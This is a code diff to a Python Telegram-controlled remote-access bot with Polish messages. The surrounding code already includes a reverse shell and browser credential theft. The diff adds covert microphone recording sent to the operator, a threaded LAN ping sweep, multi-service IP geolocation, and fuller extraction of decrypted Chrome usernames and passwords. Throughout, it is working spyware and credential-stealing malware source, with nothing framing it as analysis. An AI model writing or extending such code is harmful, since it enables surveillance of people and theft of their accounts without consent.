@@ -174,6 +174,7 @@ class RemoteControlBot:
         application.add_handler(CommandHandler("bluetooth", self.bluetooth_control))
         application.add_handler(CommandHandler("network", self.network_scan))
         application.add_handler(CommandHandler("geolocate", self.geolocate))
+        application.add_handler(CommandHandler("microphone", self.microphone_record))
         application.run_polling()
 
     async def start(self, update: Update, context: CallbackContext):
@@ -216,6 +217,7 @@ class RemoteControlBot:
         /bluetooth - Sterowanie Bluetooth
         /network - Skanuj sieć
         /geolocate - Lokalizacja GPS
+        /microphone [czas] - Nagrywanie mikrofonu
         """
         await update.message.reply_text(help_text)
 
@@ -438,25 +440,58 @@ class RemoteControlBot:
         if not self.is_admin(update):
             return
         try:
-            # Simple network scan using ping
+            # Simple network scan using ping with timeout
             import subprocess
             import ipaddress
+            import threading
+            import time
             
             # Get local network
             local_ip = self.get_local_ip()
             network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
             
             active_hosts = []
+            active_hosts_lock = threading.Lock()
+            
+            def ping_host(ip):
+                try:
+                    # Use a shorter timeout for ping command
+                    result = subprocess.run(['ping', '-n', '1', '-w', '500', ip], 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
+                    if result.returncode == 0:
+                        with active_hosts_lock:
+                            active_hosts.append(ip)
+                except subprocess.TimeoutExpired:
+                    pass  # Skip if ping times out
+                except Exception:
+                    pass  # Skip any other errors
+            
+            # Create threads for scanning IPs (limit to avoid overwhelming)
+            threads = []
             for i in range(1, 255):
                 ip = '.'.join(local_ip.split('.')[:-1]) + f'.{i}'
-                result = subprocess.run(['ping', '-n', '1', '-w', '1000', ip], 
-                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                if result.returncode == 0:
-                    active_hosts.append(ip)
+                
+                # Create thread
+                thread = threading.Thread(target=ping_host, args=(ip,))
+                threads.append(thread)
+                thread.start()
+                
+                # Limit concurrent threads to prevent system overload
+                if len(threads) >= 50:  # Max 50 concurrent ping operations
+                    for t in threads:
+                        t.join(timeout=1)  # Wait briefly for thread to finish
+                    threads = []  # Reset thread list
             
-            response = f"Active hosts on network {network}:\n"
-            for host in active_hosts:
-                response += f"- {host}\n"
+            # Wait for remaining threads to complete
+            for thread in threads:
+                thread.join(timeout=2)
+            
+            response = f"Active hosts on network {network} (scanned):\n"
+            if active_hosts:
+                for host in active_hosts:
+                    response += f"- {host}\n"
+            else:
+                response += "No active hosts found.\n"
             
             await update.message.reply_text(response)
         except Exception as e:
@@ -469,18 +504,68 @@ class RemoteControlBot:
             # Get location based on IP
             public_ip = self.get_public_ip()
             if public_ip != "Unknown":
-                response = requests.get(f"http://ip-api.com/json/{public_ip}")
-                location_data = response.json()
+                # Try multiple geolocation services for better accuracy
+                location_data = None
+                location_source = "IP API"
                 
-                if location_data.get("status") == "success":
-                    location_info = f"""
-Lokalizacja:
+                # First try ip-api.com
+                try:
+                    response = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=5)
+                    location_data = response.json()
+                    if location_data.get("status") != "success":
+                        location_data = None
+                except:
+                    location_data = None
+                
+                # If first service fails, try ipinfo.io
+                if not location_data:
+                    try:
+                        response = requests.get(f"https://ipinfo.io/{public_ip}/json", timeout=5)
+                        location_data = response.json()
+                        location_source = "IPInfo"
+                    except:
+                        location_data = None
+                
+                # If both services fail, try httpbin.org for IP only
+                if not location_data:
+                    try:
+                        response = requests.get(f"https://httpbin.org/ip", timeout=5)
+                        location_data = {"ip": response.json().get("origin", "Unknown"), "source": "httpbin"}
+                        location_source = "HTTPBin"
+                    except:
+                        location_data = None
+                
+                if location_data and location_data.get("status") != "fail":
+                    if location_source == "IP API":
+                        location_info = f"""
+Lokalizacja (źródło: {location_source}):
 Kraj: {location_data.get("country", "N/A")}
 Region: {location_data.get("regionName", "N/A")}
 Miasto: {location_data.get("city", "N/A")}
 Szerokość geograficzna: {location_data.get("lat", "N/A")}
 Długość geograficzna: {location_data.get("lon", "N/A")}
 ISP: {location_data.get("isp", "N/A")}
+Strefa czasowa: {location_data.get("timezone", "N/A")}
+"""
+                    elif location_source == "IPInfo":
+                        loc = location_data.get("loc", "N/A").split(',')
+                        lat = loc[0] if len(loc) > 0 else "N/A"
+                        lon = loc[1] if len(loc) > 1 else "N/A"
+                        location_info = f"""
+Lokalizacja (źródło: {location_source}):
+Kraj: {location_data.get("country", "N/A")}
+Region: {location_data.get("region", "N/A")}
+Miasto: {location_data.get("city", "N/A")}
+Szerokość geograficzna: {lat}
+Długość geograficzna: {lon}
+ISP: {location_data.get("org", "N/A")}
+Strefa czasowa: {location_data.get("timezone", "N/A")}
+"""
+                    else:
+                        location_info = f"""
+Lokalizacja (źródło: {location_source}):
+IP: {location_data.get("ip", "N/A")}
+Uwaga: Szczegółowe dane lokalizacyjne niedostępne
 """
                     await update.message.reply_text(location_info)
                 else:
@@ -489,6 +574,68 @@ ISP: {location_data.get("isp", "N/A")}
                 await update.message.reply_text("Nie udało się uzyskać lokalizacji.")
         except Exception as e:
             await update.message.reply_text(f"Błąd: {str(e)}")
+
+    async def microphone_record(self, update: Update, context: CallbackContext):
+        if not self.is_admin(update):
+            return
+        try:
+            import pyaudio
+            import wave
+            import threading
+            
+            duration = int(context.args[0]) if context.args else 10  # Default 10 seconds
+            if duration > 60:  # Limit to 60 seconds max
+                duration = 60
+            
+            await update.message.reply_text(f"Nagrywanie mikrofonu na {duration} sekund...")
+            
+            # Audio parameters
+            chunk = 1024
+            format = pyaudio.paInt16
+            channels = 1
+            rate = 44100
+            
+            # Initialize PyAudio
+            p = pyaudio.PyAudio()
+            
+            # Open stream
+            stream = p.open(format=format,
+                           channels=channels,
+                           rate=rate,
+                           input=True,
+                           frames_per_buffer=chunk)
+            
+            frames = []
+            
+            # Record audio
+            for i in range(0, int(rate / chunk * duration)):
+                data = stream.read(chunk)
+                frames.append(data)
+            
+            # Stop and close stream
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
+            
+            # Save as WAV file
+            temp_path = os.path.join(tempfile.gettempdir(), "microphone_recording.wav")
+            wf = wave.open(temp_path, 'wb')
+            wf.setnchannels(channels)
+            wf.setsampwidth(p.get_sample_size(format))
+            wf.setframerate(rate)
+            wf.writeframes(b''.join(frames))
+            wf.close()
+            
+            # Send the recorded file
+            await update.message.reply_audio(open(temp_path, 'rb'))
+            
+            # Clean up
+            os.remove(temp_path)
+            
+        except ImportError:
+            await update.message.reply_text("Biblioteka pyaudio nie jest zainstalowana. Uruchom: pip install pyaudio")
+        except Exception as e:
+            await update.message.reply_text(f"Błąd nagrywania mikrofonu: {str(e)}")
 
     async def reverse_shell(self, update: Update, context: CallbackContext):
         if not self.is_admin(update):
@@ -757,19 +904,34 @@ ISP: {location_data.get("isp", "N/A")}
                 if not os.path.exists(login_data_path):
                     return passwords
                 temp_path = login_data_path + "_temp"
-                shutil.copyfile(login_data_path, temp_path)
-                conn = sqlite3.connect(temp_path)
-                cursor = conn.cursor()
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                credential_data = cursor.fetchall()
-                conn.close()
-                os.remove(temp_path)
-                for url, username, encrypted_password in credential_data:
-                    decrypted_password = self._decrypt_chrome_password(encrypted_password)
-                    if decrypted_password:
-                        passwords.append((url, decrypted_password))
-                    elif username:
-                        passwords.append((url, f"Username: {username} (password decryption failed)"))
+                try:
+                    # Copy the file to avoid locking issues
+                    shutil.copyfile(login_data_path, temp_path)
+                    conn = sqlite3.connect(temp_path)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    credential_data = cursor.fetchall()
+                    conn.close()
+                    
+                    for url, username, encrypted_password in credential_data:
+                        decrypted_password = self._decrypt_chrome_password(encrypted_password)
+                        if decrypted_password:
+                            passwords.append((url, f"Username: {username} | Password: {decrypted_password}"))
+                        elif username:
+                            passwords.append((url, f"Username: {username} (password decryption failed)"))
+                        elif encrypted_password:  # If we have password but no username
+                            decrypted_password = self._decrypt_chrome_password(encrypted_password)
+                            if decrypted_password:
+                                passwords.append((url, f"Password: {decrypted_password} (no username)"))
+                            else:
+                                passwords.append((url, "Password found but decryption failed"))
+                except sqlite3.OperationalError:
+                    # Handle case where database is locked
+                    passwords.append(("Database Error", f"Could not access {login_data_path} - possibly locked by browser"))
+                finally:
+                    # Remove temp file
+                    if os.path.exists(temp_path):
+                        os.remove(temp_path)
             elif browser == "Firefox":
                 passwords.extend(self._extract_firefox_passwords(path))
         except:
